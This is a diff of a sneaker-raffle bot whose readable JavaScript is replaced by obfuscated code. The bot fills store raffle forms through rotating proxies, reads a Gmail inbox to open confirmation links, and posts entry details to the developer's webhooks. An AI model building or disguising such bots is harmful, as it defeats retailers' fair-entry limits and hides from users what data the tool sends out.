-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto(csv[i].Url, { waitUntil: 'networkidle2' });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Entry`);
-
-                            await page.waitForSelector('#accept-all-gdpr');
-                            await page.click('#accept-all-gdpr');
-                            await page.waitForSelector('#raffles-product');
-                            await delay(1000);
-                            await page.$eval('#raffles-product', btn => btn.click());
-                            await delay(5000)
-                            await page.waitForSelector(`.fancybox-inner > iframe`)
-                            var elementHandle = await page.$(
-                                '.fancybox-inner > iframe',
-                            );
-                            var frame = await elementHandle.contentFrame();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking Information`);
-
-                            await frame.waitForSelector('input[name="sm-form-email"]');
-                            await delay(500);
-                            await frame.type('input[name="sm-form-email"]', csv[i].Email);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-name"]', `${csv[i].FirstName} ${csv[i].LastName}`);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-street"]', `${csv[i].Address1} ${csv[i].HouseNumber} ${csv[i].Address2}`);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-city"]', csv[i].City);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-province"]', csv[i].State);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-zip"]', csv[i].Zip);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-country"]', csv[i].Country);
-                            await delay(200);
-                            await frame.type('input[name="sm-form-phone"]', csv[i].Phone);
-                            await delay(200);
-                            await frame.type('input[name="sm-cst.instagram_user"]', csv[i].Follower);
-                            await delay(200);
-                            await frame.type('input[name="sm-cst.size"]', csv[i].Size);
-                            await delay(500);
-                            await frame.click('.icheckbox_simple-custom.icheckbox--CONSENT');
-                            await delay(500);
-                            await frame.click('.icheckbox_simple-custom');
-                            await delay(500);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Request`);
-
-                            await frame.$eval('form', f => f.submit());
-
-
-                            console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                            retry = '';
-                            var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                            var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] },
-                                succesPUBMSG: { embeds: [succesPUB] }
+                            console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Getting\x20Session');
+                            const _0x212286 = await _0x23ffef['newPage']();
+                            await _0x212286['authenticate']({
+                                'username': '' + _0x394c30[0x2],
+                                'password': '' + _0x394c30[0x3]
+                            }), await _0x212286['setRequestInterception'](!![]), _0x212286['on']('request', _0x1c20b4 => {
+                                _0x1c20b4['resourceType']() === 'image' || _0x1c20b4['resourceType']() === 'font' || _0x1c20b4['resourceType']() === 'media' ? _0x1c20b4['abort']() : _0x1c20b4['continue']();
+                            }), await _0x212286['goto'](_0x4884d0[_0x4d8bed]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x212286['waitForSelector']('#accept-all-gdpr'), await _0x212286['click']('#accept-all-gdpr'), await _0x212286['waitForSelector']('#raffles-product'), await _0x116d4a(0x3e8), await _0x212286['$eval']('#raffles-product', _0x12ebc5 => _0x12ebc5['click']()), await _0x116d4a(0x1388), await _0x212286['waitForSelector']('.fancybox-inner\x20>\x20iframe');
+                            var _0x5aa890 = await _0x212286['$']('.fancybox-inner\x20>\x20iframe'), _0xd02852 = await _0x5aa890['contentFrame']();
+                            console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Checking\x20Information'), await _0xd02852['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x116d4a(0x1f4), await _0xd02852['type']('input[name=\x22sm-form-email\x22]', _0x4884d0[_0x4d8bed]['Email']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-name\x22]', _0x4884d0[_0x4d8bed]['FirstName'] + '\x20' + _0x4884d0[_0x4d8bed]['LastName']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-street\x22]', _0x4884d0[_0x4d8bed]['Address1'] + '\x20' + _0x4884d0[_0x4d8bed]['HouseNumber'] + '\x20' + _0x4884d0[_0x4d8bed]['Address2']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-city\x22]', _0x4884d0[_0x4d8bed]['City']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-province\x22]', _0x4884d0[_0x4d8bed]['State']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-zip\x22]', _0x4884d0[_0x4d8bed]['Zip']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-country\x22]', _0x4884d0[_0x4d8bed]['Country']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-phone\x22]', _0x4884d0[_0x4d8bed]['Phone']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x4884d0[_0x4d8bed]['Follower']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-cst.size\x22]', _0x4884d0[_0x4d8bed]['Size']), await _0x116d4a(0x1f4), await _0xd02852['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x116d4a(0x1f4), await _0xd02852['click']('.icheckbox_simple-custom'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Sending\x20Request'), await _0xd02852['$eval']('form', _0x1b236a => _0x1b236a['submit']()), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xa276b5 = '';
+                            var _0x4e9956 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', ![]), _0x3a3018 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'pub', ![]);
+                            const _0x405141 = {
+                                'succesDEVMSG': { 'embeds': [_0x4e9956] },
+                                'succesPUBMSG': { 'embeds': [_0x3a3018] }
                             };
                             try {
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                }
-                                await delay(200);
-                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                await delay(200);
-                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                            } catch (e) {
-                                console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x405141['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x405141['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x405141['succesPUBMSG']);
+                            } catch (_0xbd7c0b) {
+                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xbd7c0b));
                             }
-
-
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`
-                            var errorDEV = await makeEmbed(csv[i], currentFunction, 'dev', true, ERROR);
-                            var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                            var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] },
-                                succesPUBMSG: { embeds: [succesPUB] }
+                        } catch (_0x229718) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20' + _0x229718)), _0x76967c = '' + _0x229718;
+                            var _0x184c50 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', !![], _0x76967c), _0x4e9956 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', ![]), _0x3a3018 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'pub', ![]);
+                            const _0x4c509c = {
+                                'succesDEVMSG': { 'embeds': [_0x4e9956] },
+                                'succesPUBMSG': { 'embeds': [_0x3a3018] }
                             };
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            if (e != 'Error sending entry. Check if duplicate, or proxies.') {
-
-                                retry = 'yes';
-                            }
+                            _0x4c509c['errorDEV'] = { 'embeds': [_0x184c50] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x4c509c['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x4c509c['errorDEV']), _0x229718 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xa276b5 = 'yes');
                         } finally {
-                            browser.close();
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5) `));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x23ffef['close']();
+                            if (_0xa276b5 == 'yes' && _0x39baf7 != 0x5 && _0x76967c != 'Size\x20Not\x20Found') {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Retrying\x20(' + _0x39baf7 + '\x20/\x205)\x20')), _0x4d8bed = _0x4d8bed - 0x1, _0x39baf7 = _0x39baf7 + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(csv[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            _0xa276b5 == 'yes' && _0x39baf7 >= 0x5 && (_0x5925c7(_0x4884d0[_0x4d8bed], _0x4f3ce4), _0xa276b5 = 'no', _0x39baf7 = 0x0), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             },
             {
-                name: '4ELEMENTOS Link Verification',
-                store: '4ELEMENTOS',
-                logo: 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
-                function: async function (currentFunction, proxies) {
-                    var links = [];
-                    // console.log(`Found ${links.length} Links in Mailbox`)
-                    async function getMails() {
-                        var imap = new Imap({
-                            user: settings.masterMail,
-                            password: settings.masterPassword,
-                            host: 'imap.gmail.com',
-                            port: 993,
-                            tls: true,
-                            autotls: 'always'
+                'name': '4ELEMENTOS\x20Link\x20Verification',
+                'store': '4ELEMENTOS',
+                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
+                'function': async function (_0x99fd9b, _0x5ad4a7) {
+                    var _0x51b3f8 = [];
+                    async function _0x21ba67() {
+                        var _0x5c1c72 = new _0x3e4e8d({
+                            'user': _0x51d52a['masterMail'],
+                            'password': _0x51d52a['masterPassword'],
+                            'host': 'imap.gmail.com',
+                            'port': 0x3e1,
+                            'tls': !![],
+                            'autotls': 'always'
                         });
-
-                        function openInbox(cb) {
-                            imap.openBox('INBOX', false, cb);
+                        function _0x4c30f0(_0xa61887) {
+                            _0x5c1c72['openBox']('INBOX', ![], _0xa61887);
                         }
-
-                        imap.once('ready', function () {
-                            openInbox(function (err, box) {
-                                console.clear()
-                                console.log('Looking For Links')
-                                if (err) throw err;
-                                imap.seq.search(['UNSEEN'], function (err, results) {
-                                    if (!results || !results.length) {
-                                        console.log(`${getTime()} [${currentFunction.name}] No mails found`);
-
-                                        imap.end();
-
-                                    } else {
-                                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                        f.on('message', function (msg, seqno) {
-                                            // console.log('Message #%d', seqno);
-                                            var prefix = '(#' + seqno + ') ';
-                                            msg.on('body', function (stream, info) {
-                                                simpleParser(stream, (err, mail) => {
-                                                    if (mail.subject == 'Confirm your subscription to the Raffle || Confirma tu suscripción al Raffle') {
-
-                                                        var msgSplit = mail.html.split('\n')
-                                                        for (var i = 0; i < msgSplit.length; i++) {
-                                                            if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                                var linklong = msgSplit[i].split('href="')
-                                                                var l = linklong[1].split('"')[0]
-                                                                links.push(l)
+                        _0x5c1c72['once']('ready', function () {
+                            _0x4c30f0(function (_0x4801b4, _0x3e7a77) {
+                                console['clear'](), console['log']('Looking\x20For\x20Links');
+                                if (_0x4801b4)
+                                    throw _0x4801b4;
+                                _0x5c1c72['seq']['search'](['UNSEEN'], function (_0x413402, _0x3b72a6) {
+                                    if (!_0x3b72a6 || !_0x3b72a6['length'])
+                                        console['log'](_0x3982db() + '\x20[' + _0x99fd9b['name'] + ']\x20No\x20mails\x20found'), _0x5c1c72['end']();
+                                    else {
+                                        var _0x972bb7 = _0x5c1c72['seq']['fetch'](_0x3b72a6, {
+                                            'bodies': '',
+                                            'markSeen': !![]
+                                        });
+                                        _0x972bb7['on']('message', function (_0x1a3dfb, _0x3936c9) {
+                                            var _0x16dd07 = '(#' + _0x3936c9 + ')\x20';
+                                            _0x1a3dfb['on']('body', function (_0x1ae1f1, _0x118b42) {
+                                                _0x300bc8(_0x1ae1f1, (_0x3ae10c, _0x3e2ca9) => {
+                                                    if (_0x3e2ca9['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
+                                                        var _0x23a6d1 = _0x3e2ca9['html']['split']('\x0a');
+                                                        for (var _0xd3d4e1 = 0x0; _0xd3d4e1 < _0x23a6d1['length']; _0xd3d4e1++) {
+                                                            if (_0x23a6d1[_0xd3d4e1]['includes']('salesmanago') && _0x23a6d1[_0xd3d4e1]['includes']('<td') && _0x23a6d1[_0xd3d4e1]['includes']('href')) {
+                                                                var _0x15c25d = _0x23a6d1[_0xd3d4e1]['split']('href=\x22'), _0x2592ef = _0x15c25d[0x1]['split']('\x22')[0x0];
+                                                                _0x51b3f8['push'](_0x2592ef);
                                                                 break;
                                                             }
                                                         }
                                                     }
-                                                    // console.log(mail.html.split('\n'));
-                                                    // mes = mail.text.split('[')[2]
-                                                    // link = mes.split(']')[0];
-                                                    // console.log(link);
                                                 });
-                                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
+                                            }), _0x1a3dfb['once']('end', function () {
                                             });
-                                            // msg.once('attributes', function (attrs) {
-                                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                            // });
-                                            msg.once('end', function () {
-                                                // console.log(prefix + 'Finished');
-
-
-                                            });
+                                        }), _0x972bb7['once']('error', function (_0x2ffcf4) {
+                                            console['log']('Fetch\x20error:\x20' + _0x2ffcf4);
+                                        }), _0x972bb7['once']('end', function () {
+                                            _0x5c1c72['end']();
                                         });
-                                        f.once('error', function (err) {
-                                            console.log('Fetch error: ' + err);
-                                        });
-                                        f.once('end', function () {
-                                            // console.log('Done fetching all messages!');
-                                            imap.end();
-                                        });
-                                    }
-                                })
-                            });
-                        });
-
-
-
-                        imap.once('error', function (err) {
-                            console.log(chalk.red(err.message))
-                            console.log('Read the guide on how to setup your mailbox')
-                        });
-
-                        imap.once('end', async function () {
-
-
-                            // console.log('Connection ended');
-                        });
-
-                        imap.connect();
-                    }
-                    async function verify(currentFunction, links, proxies) {
-                        for (var i = 0; i < links.length; i++) {
-                            async function verifyFunction(i, mode, currentFunction, oqium, proxies) {
-
-                                var ERROR;
-                                var data = {};
-                                var embed = [];
-                                var msg = {};
-                                var sizeArray = [
-                                    '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-                                ]
-                                var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-                                if (
-                                    oqium[i].Size == 'RANDOM'
-                                ) {
-                                    oqium[i].Size = sizeArray[randomSize]
-                                }
-                                if (!oqium) {
-                                    oqium = {
-
-                                    };
-                                }
-
-
-                                if (settings.useRandomProxy = false) {
-                                    var proxySplit = proxies[i].split(":");
-                                } else {
-                                    var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                    var proxySplit = proxies[randomProxy].split(":");
-                                }
-
-
-
-                                var options = {
-                                    jar: j,
-                                    followAllRedirects: true,
-                                    method: 'POST',
-                                    url: currentFunction.url,
-                                    headers: currentFunction.headers,
-                                    body: JSON.stringify(data),
-                                    proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
-                                };
-                                if (mode != 'ver') {
-                                    options.url = currentFunction.url
-                                    options.headers = currentFunction.headers
-                                }
-                                if (mode == 'ver') {
-                                    options.method = 'GET';
-                                    options.url = oqium[i]
-                                }
-                                return new Promise(function (resolve, reject) {
-                                    callback = async (err, res, body) => {
-                                        if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-                                            if (mode != 'ver') {
-                                                var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-                                                var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-                                                const EMBEDS =
-                                                {
-                                                    succesDEVMSG: { embeds: [succesDEV] },
-                                                    succesPUBMSG: { embeds: [succesPUB] }
-                                                };
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    try {
-
-                                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                                    } catch {
-
-                                                    }
-                                                }
-                                                await delay(200);
-                                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                                await delay(200);
-                                                try {
-
-                                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                                } catch {
-
-                                                }
-                                                successfulLog(oqium[i], currentFunction);
-                                            }
-
-                                            resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
-                                        } else {
-                                            if (mode != 'ver') {
-                                                var ERROR = `${err}`;
-                                                var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-                                                var EMBEDS = {}
-                                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                                errorLog(oqium[i], currentFunction)
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                                }
-                                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-                                            }
-                                            reject(console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`)));
-                                        }
-                                    }
-                                    try {
-                                        if (mode != 'ver') {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-                                        } else {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Fetching Response`)
-
-                                        }
-                                        request(options, callback);
-                                    } catch (err) {
-                                        console.log(`${getTime()} Task ${i + 1}: ${err}`);
                                     }
                                 });
-                            };
+                            });
+                        }), _0x5c1c72['once']('error', function (_0x194fd8) {
+                            console['log'](_0x1403a4['red'](_0x194fd8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
+                        }), _0x5c1c72['once']('end', async function () {
+                        }), _0x5c1c72['connect']();
+                    }
+                    async function _0x4f6b58(_0x4df3c0, _0x2b3864, _0xb3bdbd) {
+                        for (var _0x3feed2 = 0x0; _0x3feed2 < _0x2b3864['length']; _0x3feed2++) {
+                            async function _0x366a95(_0x4b54da, _0x49e241, _0xc60e72, _0x426826, _0x36eb60) {
+                                var _0x3bd64e, _0x5c6f44 = {}, _0x5f480b = [], _0x4ed3b7 = {}, _0x149574 = [
+                                    '40',
+                                    '40,5',
+                                    '41',
+                                    '42',
+                                    '42,5',
+                                    '43',
+                                    '44',
+                                    '45',
+                                    '45,5',
+                                    '46',
+                                    '47',
+                                    '47,5',
+                                    '48'
+                                ], _0x63e1b9 = Math['round'](Math['random']() * (_0x149574['length'] - 0x1));
+                                _0x426826[_0x4b54da]['Size'] == 'RANDOM' && (_0x426826[_0x4b54da]['Size'] = _0x149574[_0x63e1b9]);
+                                !_0x426826 && (_0x426826 = {});
+                                if (_0x51d52a['useRandomProxy'] = ![])
+                                    var _0x5c78a4 = _0x36eb60[_0x4b54da]['split'](':');
+                                else
+                                    var _0xd345b7 = Math['round'](Math['random']() * (_0x36eb60['length'] - 0x1)), _0x5c78a4 = _0x36eb60[_0xd345b7]['split'](':');
+                                var _0x147a17 = {
+                                    'jar': _0x103baf,
+                                    'followAllRedirects': !![],
+                                    'method': 'POST',
+                                    'url': _0xc60e72['url'],
+                                    'headers': _0xc60e72['headers'],
+                                    'body': JSON['stringify'](_0x5c6f44),
+                                    'proxy': 'http://' + _0x5c78a4[0x2] + ':' + _0x5c78a4[0x3] + '@' + _0x5c78a4[0x0] + ':' + _0x5c78a4[0x1]
+                                };
+                                return _0x49e241 != 'ver' && (_0x147a17['url'] = _0xc60e72['url'], _0x147a17['headers'] = _0xc60e72['headers']), _0x49e241 == 'ver' && (_0x147a17['method'] = 'GET', _0x147a17['url'] = _0x426826[_0x4b54da]), new Promise(function (_0x116be0, _0x3a481f) {
+                                    callback = async (_0x3bc063, _0x3a8ef6, _0x5eb668) => {
+                                        if (!_0x3bc063 && _0x3a8ef6['statusCode'] == 0xca || !_0x3bc063 && _0x3a8ef6['statusCode'] == 0xc8) {
+                                            if (_0x49e241 != 'ver') {
+                                                var _0x7cb4b9 = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'dev', ![]), _0x1aadfb = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'pub', ![]);
+                                                const _0x3b34d7 = {
+                                                    'succesDEVMSG': { 'embeds': [_0x7cb4b9] },
+                                                    'succesPUBMSG': { 'embeds': [_0x1aadfb] }
+                                                };
+                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                                                    try {
+                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x3b34d7['succesDEVMSG']);
+                                                    } catch {
+                                                    }
+                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x3b34d7['succesDEVMSG']), await _0x116d4a(0xc8);
+                                                try {
+                                                    await _0x3c7bbe(_0x55a106, _0x3b34d7['succesPUBMSG']);
+                                                } catch {
+                                                }
+                                                _0x523ce4(_0x426826[_0x4b54da], _0xc60e72);
+                                            }
+                                            _0x116be0(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Raffle\x20Entered!')));
+                                        } else {
+                                            if (_0x49e241 != 'ver') {
+                                                var _0x3587d2 = '' + _0x3bc063, _0x1222ed = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'dev', !![], _0x3587d2), _0x4f92b0 = {};
+                                                _0x4f92b0['errorDEV'] = { 'embeds': [_0x1222ed] }, _0x5925c7(_0x426826[_0x4b54da], _0xc60e72), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x4f92b0['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x4f92b0['errorDEV']);
+                                            }
+                                            _0x3a481f(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20' + _0x3bc063)));
+                                        }
+                                    };
+                                    try {
+                                        _0x49e241 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5c6f44['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x147a17, callback);
+                                    } catch (_0x2a0be8) {
+                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20' + _0x2a0be8);
+                                    }
+                                });
+                            }
+                            ;
                             try {
-                                await verifyFunction(i, 'ver', currentFunction, links, proxies);
-                                console.log(`${getTime()} [${currentFunction.name}] Sleeping for ${settings.delay} ms`);
-                                await delay(settings.delay);
-
-                            } catch (e) {
-
+                                await _0x366a95(_0x3feed2, 'ver', _0x4df3c0, _0x2b3864, _0xb3bdbd), console['log'](_0x3982db() + '\x20[' + _0x4df3c0['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            } catch (_0x7b5ae2) {
                             }
                         }
                     }
                     try {
-                        getMails();
-                        await delay(4000);
-                        console.log(`Found ${links.length} Links in Mailbox`)
-
+                        _0x21ba67(), await _0x116d4a(0xfa0), console['log']('Found\x20' + _0x51b3f8['length'] + '\x20Links\x20in\x20Mailbox');
                     } catch {
-                        console.log(`Searching mailbox failed, please read the guide on how to setup..`)
+                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                     }
-
-                    await verify(currentFunction, links, proxies);
-
+                    await _0x4f6b58(_0x99fd9b, _0x51b3f8, _0x5ad4a7);
                 }
             }
         ]
     },
     {
-        name: 'AFEW Store',
-        modules: [
-            {
-                name: 'AFEW Raffle Entries',
-                store: 'AFEW',
-                logo: 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
-                function: async function (currentFunction, afew, proxies) {
-                    for (var i = 0; i < afew.length; i++) {
-                        settings.AfewDelay = settings.delay;
-                        var ERROR;
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var url = afew[i].Url
-                        var task = afew[i]
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${afew.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        try {
-                            await jig(afew, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-                        async function checkDuplicate(csv) {
-                            const successFile = fs.readFileSync('../successful-tasks.csv', 'utf8');
-                            const success = Papa.parse(successFile, { header: true }).data
-                            // console.log(success)
-                            let duplicate = false
-                            for (var task of success) {
-                                if (task.Url == csv.Url && task.Email == csv.Email) {
-                                    duplicate = true;
-                                    break;
-                                }
-                            }
-                            return duplicate;
-
-                        }
-                        if (await checkDuplicate(afew[i]) == true) {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task Already Entered, Going to Next Task`);
-                            continue;
-                        }
-                        var succesDEV = await makeEmbed(afew[i], currentFunction, 'dev', false);
-                        var succesPUB = await makeEmbed(afew[i], currentFunction, 'pub', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] },
-                            succesPUBMSG: { embeds: [succesPUB] }
-                        };
-                        if (afew[i].Email == '' || afew[i].FirstName == '' || afew[i].LastName == '' || afew[i].Country == '' || afew[i].Size == '' || afew[i].Address1 == '' || afew[i].Zip == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
-                        try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-
-                        } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-                        }
-
-
-                        try {
-                            var sizes = JSON.parse(fs.readFileSync("sizes.json", "utf-8"));
-                            var url = afew[i].Url;
-                            var EU = afew[i].Size;
-                            var PID_Link;
-                            async function checkVariant() {
-                                // var data = new FormData();
-                                // var handler = new htmlparser.DefaultHandler(function (error, dom) {
-                                //     if (error) {
-                                //         console.log(error);
-                                //     }
-                                //     else {
-
-                                //     }
-                                // });
-                                // var parser = new htmlparser.Parser(handler);
-
-                                var cookieJar = new jar.CookieJar();
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-
-                                var variant;
-                                let request1 = {
-                                    method: 'GET',
-                                    cookieJar: cookieJar,
